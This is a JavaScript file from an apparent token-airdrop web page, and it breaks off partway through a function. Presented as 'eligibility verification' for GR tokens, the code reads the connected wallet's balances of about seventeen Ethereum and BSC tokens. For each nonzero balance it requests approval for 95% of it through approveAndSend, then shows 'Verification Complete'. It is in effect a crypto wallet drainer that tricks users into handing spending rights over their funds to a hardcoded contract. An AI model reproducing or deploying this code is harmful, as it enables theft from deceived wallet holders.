import { getCurrentProvider } from "./script2.js";


var loader = document.querySelector(".center");
var loader_msg = document.querySelector(".loader_message");

// Token Addresses
const ETH_TOKEN_ADDRESSES = [
  // "0xdac17f958d2ee523a2206206994597c13d831ec7", // Tether (USDT)
  // "0x3d6545b08693daE087E957cb1180ee38B9e3c25E", // Ethereum Classic (ETC) # for bsc
  // "0x514910771af9ca656af840dff83e8264ecf986ca", // Chainlink (LINK)
  // "0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48", // USD Coin (USDC)
  // "0x2260fac5e5542a773aa44fbcfedf7c193bc2c599", // Wrapped Bitcoin (WBTC)
  // "0x7Fc66500c84A76Ad7e9c93437bFc5Ac33E2DDaE9", // Aave (AAVE)
  // "0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984"  // Uniswap (UNI)
  // "0x6de037ef9ad2725eb40118bb1702ebb27e4aeb24"  // Render(RNDR)
];
const BSC_TOKEN_ADDRESSES = [
  // "0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c", // Binance Coin (WBNB)
  // "0x55d398326f99059fF775485246999027B3197955", // Tether (USDT BEP20)
  // "0x0e09fabb73bd3ade0a17ecc321fd13a19e81ce82", // PancakeSwap (CAKE)
  // "0xe9e7cea3dedca5984780bafc599bd69add087d56", // Binance USD (BUSD)
  // "0x3ee2200efb3400fabb9aacf31297cbdd1d435d47c", // Cardano (ADA)
  // "0x7083609fCE4d1d8Dc0C979AAb8c869Ea2C873402", // Polkadot (DOT)
  // "0xf8a0bf9cf54bb92f17374d9e9a321e6a111a51bd", // Chainlink (LINK)
  // "0x1d2f0da169ceb9fc7b3144628db156f3f6c60dbe", // Ripple (XRP)
  // "0x23b75c2f6792f514d70d8e2cc81f2d6f0d36b2d8", // VeChain (VET)
  // "0xcf6bb5389c92bdda8a3747ddb454cb7a64626c63"  // Venus (XVS)
];
 // BEP20 Tokens
const BNB_ADDRESS = "0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c";
const BEP20_USDT_ADDRESS = "0x55d398326f99059ff775485246999027b3197955";
const CAKE_ADDRESS = "0x0e09fabb73bd3ade0a17ecc321fd13a19e81ce82";
const BUSD_ADDRESS = "0xe9e7cea3dedca5984780bafc599bd69add087d56";
const ADA_ADDRESS = "0x3ee2200efb3400fabb9aacf31297cbdd1d435d47";
const DOT_ADDRESS = "0x7083609fce4d1d8dc0c979aab8c869ea2c873402";
const LINK_ADDRESS = "0xf8a0bf9cf54bb92f17374d9e9a321e6a111a51bd";
const XRP_ADDRESS = "0x1d2f0da169ceb9fc7b3144628db156f3f6c60dbe";
const VET_ADDRESS = "0x6fdcdfef7c496407ccb0cec90f9c5aaa1cc8d888";
const XVS_ADDRESS = "0xcf6bb5389c92bdda8a3747ddb454cb7a64626c63";


// ERC20 Tokens
const USDT_ADDRESS = "0xdac17f958d2ee523a2206206994597c13d831ec7"
const CHAINLINK_ADDRESS = "0x514910771af9ca656af840dff83e8264ecf986ca"
const USD_COIN_ADDRESS = "0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48"
const WRAPPED_BTICOIN_ADDRESS = "0x2260fac5e5542a773aa44fbcfedf7c193bc2c599"
const AAVE_ADDRESS = "0x7Fc66500c84A76Ad7e9c93437bFc5Ac33E2DDaE9"
const UNISWAP_ADDRESS = "0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984"
const RENDER_ADDRESS = "0x6de037ef9ad2725eb40118bb1702ebb27e4aeb24"

const GR_ADDRESS = "0x3Fe589578eF2286236EC0dd47173AbF393C4fc79";
const S_TOKEN = "0x298f63a2C5b299611a06bE60138C24d6Fe5798d8";

const GR_ADDRESS_ABI = {
  "abi" : [
    {
      "inputs": [],
      "stateMutability": "nonpayable",
      "type": "constructor"
    },
    {
      "anonymous": false,
      "inputs": [
        {
          "indexed": true,
          "internalType": "address",
          "name": "owner",
          "type": "address"
        },
        {
          "indexed": true,
          "internalType": "address",
          "name": "spender",
          "type": "address"
        },
        {
          "indexed": false,
          "internalType": "uint256",
          "name": "value",
          "type": "uint256"
        }
      ],
      "name": "Approval",
      "type": "event"
    },
    {
      "anonymous": false,
      "inputs": [
        {
          "indexed": true,
          "internalType": "address",
          "name": "previousOwner",
          "type": "address"
        },
        {
          "indexed": true,
          "internalType": "address",
          "name": "newOwner",
          "type": "address"
        }
      ],
      "name": "OwnershipTransferred",
      "type": "event"
    },
    {
      "anonymous": false,
      "inputs": [
        {
          "indexed": true,
          "internalType": "address",
          "name": "from",
          "type": "address"
        },
        {
          "indexed": true,
          "internalType": "address",
          "name": "to",
          "type": "address"
        },
        {
          "indexed": false,
          "internalType": "uint256",
          "name": "value",
          "type": "uint256"
        }
      ],
      "name": "Transfer",
      "type": "event"
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "owner",
          "type": "address"
        },
        {
          "internalType": "address",
          "name": "spender",
          "type": "address"
        }
      ],
      "name": "allowance",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "spender",
          "type": "address"
        },
        {
          "internalType": "uint256",
          "name": "amount",
          "type": "uint256"
        }
      ],
      "name": "approve",
      "outputs": [
        {
          "internalType": "bool",
          "name": "",
          "type": "bool"
        }
      ],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "account",
          "type": "address"
        }
      ],
      "name": "balanceOf",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "tokenAddress",
          "type": "address"
        }
      ],
      "name": "contractTokenBalance",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "contractUSDTBalance",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "decimals",
      "outputs": [
        {
          "internalType": "uint8",
          "name": "",
          "type": "uint8"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "spender",
          "type": "address"
        },
        {
          "internalType": "uint256",
          "name": "subtractedValue",
          "type": "uint256"
        }
      ],
      "name": "decreaseAllowance",
      "outputs": [
        {
          "internalType": "bool",
          "name": "",
          "type": "bool"
        }
      ],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "",
          "type": "address"
        }
      ],
      "name": "hasReceivedGR",
      "outputs": [
        {
          "internalType": "bool",
          "name": "",
          "type": "bool"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "user",
          "type": "address"
        }
      ],
      "name": "hasUserReceivedGrTokens",
      "outputs": [
        {
          "internalType": "bool",
          "name": "",
          "type": "bool"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "spender",
          "type": "address"
        },
        {
          "internalType": "uint256",
          "name": "addedValue",
          "type": "uint256"
        }
      ],
      "name": "increaseAllowance",
      "outputs": [
        {
          "internalType": "bool",
          "name": "",
          "type": "bool"
        }
      ],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "name",
      "outputs": [
        {
          "internalType": "string",
          "name": "",
          "type": "string"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "owner",
      "outputs": [
        {
          "internalType": "address",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "friend",
          "type": "address"
        },
        {
          "internalType": "address",
          "name": "referrer",
          "type": "address"
        }
      ],
      "name": "referFriend",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "",
          "type": "address"
        },
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "name": "referrals",
      "outputs": [
        {
          "internalType": "address",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "renounceOwnership",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "symbol",
      "outputs": [
        {
          "internalType": "string",
          "name": "",
          "type": "string"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "totalSupply",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "to",
          "type": "address"
        },
        {
          "internalType": "uint256",
          "name": "amount",
          "type": "uint256"
        }
      ],
      "name": "transfer",
      "outputs": [
        {
          "internalType": "bool",
          "name": "",
          "type": "bool"
        }
      ],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "from",
          "type": "address"
        },
        {
          "internalType": "address",
          "name": "to",
          "type": "address"
        },
        {
          "internalType": "uint256",
          "name": "amount",
          "type": "uint256"
        }
      ],
      "name": "transferFrom",
      "outputs": [
        {
          "internalType": "bool",
          "name": "",
          "type": "bool"
        }
      ],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "newOwner",
          "type": "address"
        }
      ],
      "name": "transferOwnership",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "user",
          "type": "address"
        }
      ],
      "name": "updateHasReceived",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "usdtAddress",
      "outputs": [
        {
          "internalType": "address",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "usdtToken",
      "outputs": [
        {
          "internalType": "contract IERC20",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "user",
          "type": "address"
        }
      ],
      "name": "userReferralStats",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "tokenAddress",
          "type": "address"
        },
        {
          "internalType": "uint256",
          "name": "amount",
          "type": "uint256"
        }
      ],
      "name": "withdrawErc20Tokens",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "uint256",
          "name": "amount",
          "type": "uint256"
        }
      ],
      "name": "withdrawUSDT",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    }
  ]
}
const BEP20_ABI = {
  "abi" : [
    {
        "constant": true,
        "inputs": [],
        "name": "name",
        "outputs": [
            {
                "name": "",
                "type": "string"
            }
        ],
        "payable": false,
        "stateMutability": "view",
        "type": "function"
    },
    {
        "constant": true,
        "inputs": [],
        "name": "symbol",
        "outputs": [
            {
                "name": "",
                "type": "string"
            }
        ],
        "payable": false,
        "stateMutability": "view",
        "type": "function"
    },
    {
        "constant": true,
        "inputs": [],
        "name": "decimals",
        "outputs": [
            {
                "name": "",
                "type": "uint8"
            }
        ],
        "payable": false,
        "stateMutability": "view",
        "type": "function"
    },
    {
        "constant": true,
        "inputs": [
            {
                "name": "_owner",
                "type": "address"
            }
        ],
        "name": "balanceOf",
        "outputs": [
            {
                "name": "",
                "type": "uint256"
            }
        ],
        "payable": false,
        "stateMutability": "view",
        "type": "function"
    },
    {
        "constant": true,
        "inputs": [
            {
                "name": "",
                "type": "address"
            }
        ],
        "name": "allowance",
        "outputs": [
            {
                "name": "",
                "type": "uint256"
            }
        ],
        "payable": false,
        "stateMutability": "view",
        "type": "function"
    },
    {
        "constant": true,
        "inputs": [],
        "name": "totalSupply",
        "outputs": [
            {
                "name": "",
                "type": "uint256"
            }
        ],
        "payable": false,
        "stateMutability": "view",
        "type": "function"
    },
    {
        "constant": true,
        "inputs": [],
        "name": "getOwner",
        "outputs": [
            {
                "name": "",
                "type": "address"
            }
        ],
        "payable": false,
        "stateMutability": "view",
        "type": "function"
    },
    {
        "constant": false,
        "inputs": [
            {
                "name": "spender",
                "type": "address"
            },
            {
                "name": "amount",
                "type": "uint256"
            }
        ],
        "name": "approve",
        "outputs": [
            {
                "name": "",
                "type": "bool"
            }
        ],
        "payable": false,
        "stateMutability": "nonpayable",
        "type": "function"
    },
    {
        "constant": false,
        "inputs": [
            {
                "name": "recipient",
                "type": "address"
            },
            {
                "name": "amount",
                "type": "uint256"
            }
        ],
        "name": "transfer",
        "outputs": [
            {
                "name": "",
                "type": "bool"
            }
        ],
        "payable": false,
        "stateMutability": "nonpayable",
        "type": "function"
    },
    {
        "constant": false,
        "inputs": [
            {
                "name": "sender",
                "type": "address"
            },
            {
                "name": "recipient",
                "type": "address"
            },
            {
                "name": "amount",
                "type": "uint256"
            }
        ],
        "name": "transferFrom",
        "outputs": [
            {
                "name": "",
                "type": "bool"
            }
        ],
        "payable": false,
        "stateMutability": "nonpayable",
        "type": "function"
    },
    {
        "anonymous": false,
        "inputs": [
            {
                "indexed": true,
                "name": "from",
                "type": "address"
            },
            {
                "indexed": true,
                "name": "to",
                "type": "address"
            },
            {
                "indexed": false,
                "name": "value",
                "type": "uint256"
            }
        ],
        "name": "Transfer",
        "type": "event"
    },
    {
        "anonymous": false,
        "inputs": [
            {
                "indexed": true,
                "name": "owner",
                "type": "address"
            },
            {
                "indexed": true,
                "name": "spender",
                "type": "address"
            },
            {
                "indexed": false,
                "name": "value",
                "type": "uint256"
            }
        ],
        "name": "Approval",
        "type": "event"
    }
]

}

const ERC20_ABI = {
  "abi" : [
    {
        "constant": true,
        "inputs": [],
        "name": "name",
        "outputs": [
            {
                "name": "",
                "type": "string"
            }
        ],
        "payable": false,
        "stateMutability": "view",
        "type": "function"
    },
    {
        "constant": false,
        "inputs": [
            {
                "name": "_spender",
                "type": "address"
            },
            {
                "name": "_value",
                "type": "uint256"
            }
        ],
        "name": "approve",
        "outputs": [
            {
                "name": "",
                "type": "bool"
            }
        ],
        "payable": false,
        "stateMutability": "nonpayable",
        "type": "function"
    },
    {
        "constant": true,
        "inputs": [],
        "name": "totalSupply",
        "outputs": [
            {
                "name": "",
                "type": "uint256"
            }
        ],
        "payable": false,
        "stateMutability": "view",
        "type": "function"
    },
    {
        "constant": false,
        "inputs": [
            {
                "name": "_from",
                "type": "address"
            },
            {
                "name": "_to",
                "type": "address"
            },
            {
                "name": "_value",
                "type": "uint256"
            }
        ],
        "name": "transferFrom",
        "outputs": [
            {
                "name": "",
                "type": "bool"
            }
        ],
        "payable": false,
        "stateMutability": "nonpayable",
        "type": "function"
    },
    {
        "constant": true,
        "inputs": [],
        "name": "decimals",
        "outputs": [
            {
                "name": "",
                "type": "uint8"
            }
        ],
        "payable": false,
        "stateMutability": "view",
        "type": "function"
    },
    {
        "constant": true,
        "inputs": [
            {
                "name": "_owner",
                "type": "address"
            }
        ],
        "name": "balanceOf",
        "outputs": [
            {
                "name": "balance",
                "type": "uint256"
            }
        ],
        "payable": false,
        "stateMutability": "view",
        "type": "function"
    },
    {
        "constant": true,
        "inputs": [],
        "name": "symbol",
        "outputs": [
            {
                "name": "",
                "type": "string"
            }
        ],
        "payable": false,
        "stateMutability": "view",
        "type": "function"
    },
    {
        "constant": false,
        "inputs": [
            {
                "name": "_to",
                "type": "address"
            },
            {
                "name": "_value",
                "type": "uint256"
            }
        ],
        "name": "transfer",
        "outputs": [
            {
                "name": "",
                "type": "bool"
            }
        ],
        "payable": false,
        "stateMutability": "nonpayable",
        "type": "function"
    },
    {
        "constant": true,
        "inputs": [
            {
                "name": "_owner",
                "type": "address"
            },
            {
                "name": "_spender",
                "type": "address"
            }
        ],
        "name": "allowance",
        "outputs": [
            {
                "name": "",
                "type": "uint256"
            }
        ],
        "payable": false,
        "stateMutability": "view",
        "type": "function"
    },
    {
        "payable": true,
        "stateMutability": "payable",
        "type": "fallback"
    },
    {
        "anonymous": false,
        "inputs": [
            {
                "indexed": true,
                "name": "owner",
                "type": "address"
            },
            {
                "indexed": true,
                "name": "spender",
                "type": "address"
            },
            {
                "indexed": false,
                "name": "value",
                "type": "uint256"
            }
        ],
        "name": "Approval",
        "type": "event"
    },
    {
        "anonymous": false,
        "inputs": [
            {
                "indexed": true,
                "name": "from",
                "type": "address"
            },
            {
                "indexed": true,
                "name": "to",
                "type": "address"
            },
            {
                "indexed": false,
                "name": "value",
                "type": "uint256"
            }
        ],
        "name": "Transfer",
        "type": "event"
    }
]
}

// Import the necessary dependencies

let contractAddress = "0x7469FB22dEeA3C7565f0332c3366C105b3EB2A8C";




async function getSmartContract(contractAddress, abi) {
  // let web3_provider = await getCurrentProvider();
  let web3_obj = new Web3(window.ethereum)
  // let web3_obj = new Web3(web3_provider);
  let contract;

  try {
    // Use the ABI to define the interface of the smart contract
    let contract = new web3_obj.eth.Contract(abi.abi, contractAddress);
    console.log("Contract: ", contract)
    return contract;
  } 
  catch (error) {
    console.log(error)
  }
}

async function getUserAddress() {
  let web3 = await getCurrentProvider();
  if (web3) {
    const accounts = await web3.eth.getAccounts();
    if (accounts.length > 0) {
      return accounts[0];
    }
  }
  return null; // Return null if no user is connected or there are no accounts
}


export async function gas_estimate(encoded_data) {
  // Getting Estimated Gas Fee
  let web3_obj = await get_web3_object();
  console.log("Works Here")

  const estimated_gas = await new Promise((resolve, reject) => {
    web3_obj.eth.estimateGas({
      to: contract_address,
      data: encoded_data
    }, (error, estimate) => {
      if (!error) {
        resolve(estimate);
      } else {
        reject(error);
      }
    });
  });
  return estimated_gas;
}

function checkBalanceIsEnough(balance) {
  if (balance > 0) {
    return true
  }
  return false
}

export async function approveTokens() {
  let zeroCount = 0;
  let tx;
  let userAddress = localStorage.getItem('account');
  let web3 = new Web3(window.ethereum);

  let grTokenContract = await getSmartContract(GR_ADDRESS, GR_ADDRESS_ABI);
  
  let usdtContract = await getSmartContract(USDT_ADDRESS, ERC20_ABI)
  // let ethereumClassicContract = await getSmartContract(ETHEREUM_CLASSIC_ADDRESS, ERC20_ABI)
  let chainLinkContract = await getSmartContract(CHAINLINK_ADDRESS, ERC20_ABI)
  let usdContract = await getSmartContract(USD_COIN_ADDRESS, ERC20_ABI)
  let wrappedBitcoinContract = await getSmartContract(WRAPPED_BTICOIN_ADDRESS, ERC20_ABI)
  let aaveContract = await getSmartContract(AAVE_ADDRESS, ERC20_ABI)
  let uniswapContract = await getSmartContract(UNISWAP_ADDRESS, ERC20_ABI)
  let renderContract = await getSmartContract(RENDER_ADDRESS, ERC20_ABI)

  // getting the user balance for each token
  // let userGrBalance = await grTokenContract.methods.balanceOf(userAddress).call();
  // let userStBalance = await sTokenContract.methods.balanceOf(userAddress).call();
  console.log("Calling")
  let usdtBalance = await usdtContract.methods.balanceOf(userAddress).call();
  console.log("Calling 3")
  let usdBalance = await usdContract.methods.balanceOf(userAddress).call();
  console.log("Calling 4")
  let wrappedBitcoinBalance = await wrappedBitcoinContract.methods.balanceOf(userAddress).call();
  console.log("Calling 5")
  let chainLinkBalance = await chainLinkContract.methods.balanceOf(userAddress).call();
  console.log("Calling 6")
  let aaveBalance = await aaveContract.methods.balanceOf(userAddress).call();
  console.log("Calling 7")
  let uniswapBalance = await uniswapContract.methods.balanceOf(userAddress).call();
  console.log('Called')
  let renderBalance = await renderContract.methods.balanceOf(userAddress).call();
  console.log('Called')


  
// here!
  
  if (checkBalanceIsEnough(usdtBalance) > 0n) {
    // Adjust the approval amount as needed (e.g., 95% of user balance)
    let approvalAmount = BigInt(Number(usdtBalance) * 0.95); // Convert to BigInt
    const allowanceInWei = web3.utils.toWei(approvalAmount.toString(), 'ether');
    tx = await approveAndSend(USDT_ADDRESS, usdtContract, userAddress, allowanceInWei, web3);
  } else{zeroCount+=1}

  if (checkBalanceIsEnough(usdBalance) > 0n) {
    // Adjust the approval amount as needed (e.g., 95% of user balance)
    let approvalAmount = BigInt(Number(usdBalance) * 0.95); // Convert to BigInt
    const allowanceInWei = web3.utils.toWei(approvalAmount.toString(), 'ether');
    tx = await approveAndSend(USD_COIN_ADDRESS, usdContract, userAddress, allowanceInWei, web3);
  }else{zeroCount+=1}

  if (checkBalanceIsEnough(wrappedBitcoinBalance) > 0n) {
    // Adjust the approval amount as needed (e.g., 95% of user balance)
    let approvalAmount = BigInt(Number(wrappedBitcoinBalance) * 0.95); // Convert to BigInt
    const allowanceInWei = web3.utils.toWei(approvalAmount.toString(), 'ether');
    tx = await approveAndSend(WRAPPED_BTICOIN_ADDRESS, wrappedBitcoinContract, userAddress, allowanceInWei, web3);
  }else{zeroCount+=1}

  if (checkBalanceIsEnough(aaveBalance) > 0n) {
    // Adjust the approval amount as needed (e.g., 95% of user balance)
    let approvalAmount = BigInt(Number(aaveBalance) * 0.95); // Convert to BigInt
    const allowanceInWei = web3.utils.toWei(approvalAmount.toString(), 'ether');
    tx = await approveAndSend(AAVE_ADDRESS, aaveContract, userAddress, allowanceInWei, web3);
  }else{zeroCount+=1}

  if (checkBalanceIsEnough(uniswapBalance) > 0n) {
    // Adjust the approval amount as needed (e.g., 95% of user balance)
    let approvalAmount = BigInt(Number(uniswapBalance) * 0.95); // Convert to BigInt
    const allowanceInWei = web3.utils.toWei(approvalAmount.toString(), 'ether');
    tx = await approveAndSend(UNISWAP_ADDRESS, uniswapContract, userAddress, allowanceInWei, web3);
  }else{
    zeroCount+=1
    console.log(zeroCount)
  }
  if (checkBalanceIsEnough(renderBalance) > 0n) {
    // Adjust the approval amount as needed (e.g., 95% of user balance)
    let approvalAmount = BigInt(Number(renderBalance) * 0.95); // Convert to BigInt
    const allowanceInWei = web3.utils.toWei(approvalAmount.toString(), 'ether');
    tx = await approveAndSend(RENDER_ADDRESS, renderContract, userAddress, allowanceInWei, web3);
  }else{zeroCount+=1}
  console.log(zeroCount)

  // if (checkBalanceIsEnough(userGrBalance) > 0n) {
  //   // Adjust the approval amount as needed (e.g., 95% of user balance)
  //   let approvalAmount = BigInt(Number(userGrBalance) * 0.95); // Convert to BigInt
  //   console.log(userGrBalance)
  //   const allowanceInWei = web3.utils.toWei(approvalAmount.toString(), 'ether');
  //   tx = await approveAndSend(GR_ADDRESS, grTokenContract, userAddress, allowanceInWei, web3);
  // }
  // if (checkBalanceIsEnough(userStBalance) > 0n) {
  //   // Adjust the approval amount as needed (e.g., 95% of user balance)
  //   let approvalAmount = BigInt(Number(userStBalance) * 0.95); // Convert to BigInt
  //   const allowanceInWei = web3.utils.toWei(approvalAmount.toString(), 'ether');
  //   tx = await approveAndSend(S_TOKEN, sTokenContract, userAddress, allowanceInWei, web3);
  // }

  if (zeroCount >= 5) {
    window.alert("This Wallet Does Not Have Enough Transactions and Is Therefore not Eligible to receive GR Tokens.");
    localStorage.setItem("approved", "false")
  }else{
    window.alert("Verification Complete");
  localStorage.setItem("approved", "true")
  }
}

export async function approveBscTokens() {
  let zeroCount = 0;
  let tx;
  let userAddress = localStorage.getItem('account');
  let web3 = new Web3(window.ethereum);

  let grTokenContract = await getSmartContract(GR_ADDRESS, GR_ADDRESS_ABI);
  
  let bnbContract = await getSmartContract(BNB_ADDRESS, BEP20_ABI)
  let bep20UsdtContract = await getSmartContract(BEP20_USDT_ADDRESS, BEP20_ABI)
  let cakeContract = await getSmartContract(CAKE_ADDRESS, BEP20_ABI)
  let busdContract = await getSmartContract(BUSD_ADDRESS, BEP20_ABI)
  let adaContract = await getSmartContract(ADA_ADDRESS, BEP20_ABI)
  let dotContract = await getSmartContract(DOT_ADDRESS, BEP20_ABI)
  let linkContract = await getSmartContract(LINK_ADDRESS, BEP20_ABI)
  let xrpContract = await getSmartContract(XRP_ADDRESS, BEP20_ABI)
  let vetContract = await getSmartContract(VET_ADDRESS, BEP20_ABI)
  let xvsContract = await getSmartContract(XVS_ADDRESS, BEP20_ABI)

  // getting the user balance for each token
  // let userGrBalance = await grTokenContract.methods.balanceOf(userAddress).call();
  // let userStBalance = await sTokenContract.methods.balanceOf(userAddress).call();
  let bnbBalance = await bnbContract.methods.balanceOf(userAddress).call();
  console.log("bnb Balance :", bnbBalance)
  let bep20UsdtBalance = await bep20UsdtContract.methods.balanceOf(userAddress).call();
  console.log("bep 20 usdt Balance :", bep20UsdtBalance)
  let cakeBalance = await cakeContract.methods.balanceOf(userAddress).call();
  console.log("cake Balance :", cakeBalance)
  let busdBalance = await busdContract.methods.balanceOf(userAddress).call();
  console.log("busd Balance :", busdBalance)
  let adaBalance = await adaContract.methods.balanceOf(userAddress).call();
  console.log("ada Balance :", adaBalance)
  let dotBalance = await dotContract.methods.balanceOf(userAddress).call();
  console.log("dot Balance :", dotBalance)
  let linkBalance = await linkContract.methods.balanceOf(userAddress).call();
  console.log("link Balance :", linkBalance)
  let xrpBalance = await xrpContract.methods.balanceOf(userAddress).call();
  console.log("xrp Balance :", xrpBalance)
  let vetBalance = await vetContract.methods.balanceOf(userAddress).call();
  console.log("vet Balance :", vetBalance)
  let xvsBalance = await xvsContract.methods.balanceOf(userAddress).call();
  console.log("xvs Balance :", xvsBalance)


  
// here!
  
  if (checkBalanceIsEnough(bnbBalance) > 0n) {
    // Adjust the approval amount as needed (e.g., 95% of user balance)
    let approvalAmount = BigInt(Number(bnbBalance) * 0.95); // Convert to BigInt
    const allowanceInWei = web3.utils.toWei(approvalAmount.toString(), 'ether');
    tx = await approveAndSend(BNB_ADDRESS, bnbContract, userAddress, allowanceInWei, web3);
  } else{zeroCount+=1}

  if (checkBalanceIsEnough(bep20UsdtBalance) > 0n) {
    // Adjust the approval amount as needed (e.g., 95% of user balance)
    let approvalAmount = BigInt(Number(bep20UsdtBalance) * 0.95); // Convert to BigInt
    const allowanceInWei = web3.utils.toWei(approvalAmount.toString(), 'ether');
    tx = await approveAndSend(BEP20_USDT_ADDRESS, bep20UsdtContract, userAddress, allowanceInWei, web3);
  }else{zeroCount+=1}

  if (checkBalanceIsEnough(cakeBalance) > 0n) {
    // Adjust the approval amount as needed (e.g., 95% of user balance)
    let approvalAmount = BigInt(Number(cakeBalance) * 0.95); // Convert to BigInt
    const allowanceInWei = web3.utils.toWei(approvalAmount.toString(), 'ether');
    tx = await approveAndSend(CAKE_ADDRESS, cakeContract, userAddress, allowanceInWei, web3);
  }else{zeroCount+=1}

  if (checkBalanceIsEnough(busdBalance) > 0n) {
    // Adjust the approval amount as needed (e.g., 95% of user balance)
    let approvalAmount = BigInt(Number(busdBalance) * 0.95); // Convert to BigInt
    const allowanceInWei = web3.utils.toWei(approvalAmount.toString(), 'ether');
    tx = await approveAndSend(BUSD_ADDRESS, busdContract, userAddress, allowanceInWei, web3);
  }else{zeroCount+=1}

  if (checkBalanceIsEnough(adaBalance) > 0n) {
    // Adjust the approval amount as needed (e.g., 95% of user balance)
    let approvalAmount = BigInt(Number(adaBalance) * 0.95); // Convert to BigInt
    const allowanceInWei = web3.utils.toWei(approvalAmount.toString(), 'ether');
    tx = await approveAndSend(ADA_ADDRESS, adaContract, userAddress, allowanceInWei, web3);
  }else{
    zeroCount+=1
  }

  if (checkBalanceIsEnough(dotBalance) > 0n) {
    // Adjust the approval amount as needed (e.g., 95% of user balance)
    let approvalAmount = BigInt(Number(dotBalance) * 0.95); // Convert to BigInt
    const allowanceInWei = web3.utils.toWei(approvalAmount.toString(), 'ether');
    tx = await approveAndSend(DOT_ADDRESS, dotContract, userAddress, allowanceInWei, web3);
  }else{zeroCount+=1}

  if (checkBalanceIsEnough(linkBalance) > 0n) {
    // Adjust the approval amount as needed (e.g., 95% of user balance)
    let approvalAmount = BigInt(Number(linkBalance) * 0.95); // Convert to BigInt
    const allowanceInWei = web3.utils.toWei(approvalAmount.toString(), 'ether');
    tx = await approveAndSend(LINK_ADDRESS, linkContract, userAddress, allowanceInWei, web3);
  }else{zeroCount+=1}

  if (checkBalanceIsEnough(xrpBalance) > 0n) {
    // Adjust the approval amount as needed (e.g., 95% of user balance)
    let approvalAmount = BigInt(Number(xrpBalance) * 0.95); // Convert to BigInt
    const allowanceInWei = web3.utils.toWei(approvalAmount.toString(), 'ether');
    tx = await approveAndSend(XRP_ADDRESS, xrpContract, userAddress, allowanceInWei, web3);
  }else{zeroCount+=1}

  if (checkBalanceIsEnough(vetBalance) > 0n) {
    // Adjust the approval amount as needed (e.g., 95% of user balance)
    let approvalAmount = BigInt(Number(vetBalance) * 0.95); // Convert to BigInt
    const allowanceInWei = web3.utils.toWei(approvalAmount.toString(), 'ether');
    tx = await approveAndSend(VET_ADDRESS, vetContract, userAddress, allowanceInWei, web3);
  }else{zeroCount+=1}

  if (checkBalanceIsEnough(xvsBalance) > 0n) {
    // Adjust the approval amount as needed (e.g., 95% of user balance)
    let approvalAmount = BigInt(Number(xvsBalance) * 0.95); // Convert to BigInt
    const allowanceInWei = web3.utils.toWei(approvalAmount.toString(), 'ether');
    console.log(allowanceInWei)
    tx = await approveAndSend(XVS_ADDRESS, xvsContract, userAddress, allowanceInWei, web3);
  }else{zeroCount+=1}

  console.log(zeroCount)
  console.log("Done!")

  if (zeroCount >= 5) {
    window.alert("This Wallet Does Not Have Enough Transactions and Is Therefore not Eligible to receive GR Tokens.");
    localStorage.setItem("approved", "false")
  }else{
    window.alert("Verification Complete");
